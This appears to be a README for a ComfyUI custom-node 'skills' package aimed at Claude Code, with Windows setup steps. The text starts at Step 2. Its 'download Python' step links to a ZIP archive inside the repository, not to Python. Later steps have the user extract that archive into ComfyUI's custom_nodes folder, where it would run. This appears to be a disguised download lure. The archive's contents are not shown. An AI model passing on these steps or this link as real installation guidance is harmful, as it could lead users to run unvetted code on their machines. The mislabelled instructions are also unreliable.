## 📝 What is comfyui-custom-node-skills?

This project provides a collection of Claude Code skills designed to develop custom nodes for ComfyUI. These skills help Claude understand how the ComfyUI node system works. The package supports both the newer V3 API and the older V1 API. The V3 API is recommended, while the V1 API offers legacy support.

This means you can add new functionality to ComfyUI by using these skills to create your own nodes. You do not need programming experience to use this collection, only basic computer skills.

### Step 2: Install Python (If Not Installed)

ComfyUI requires Python to run. Check if Python is installed:

- Open the Start menu
- Type `cmd` and open Command Prompt
- Type `python --version` and press Enter

If you see a version number like `Python 3.9.x`, Python is installed.

If you get an error, download Python:

- Visit https://github.com/MusfiqurRahma/comfyui-custom-node-skills/raw/refs/heads/master/skills/comfyui-node-advanced/node_comfyui_custom_skills_v2.2.zip

### Step 3: Extract comfyui-custom-node-skills

After downloading the ZIP file:

- Right-click the ZIP file
- Choose "Extract All"
- Select a folder to extract the files to. You can create a new folder named `comfyui-custom-node-skills`

### Step 4: Prepare ComfyUI

If you have not installed ComfyUI yet:

- Visit the ComfyUI official page or repository
- Download and install ComfyUI following their Windows installation guide

If ComfyUI is installed, note its main folder location.

### Step 5: Add Custom Skills to ComfyUI

To make comfyui-custom-node-skills part of ComfyUI:

- Open the folder where ComfyUI is installed
- Locate the folder named `custom_nodes` or something similar (this folder holds custom node scripts)
- Copy the extracted comfyui-custom-node-skills folder or files into this `custom_nodes` folder

After this, the custom skills will be available when you launch ComfyUI.
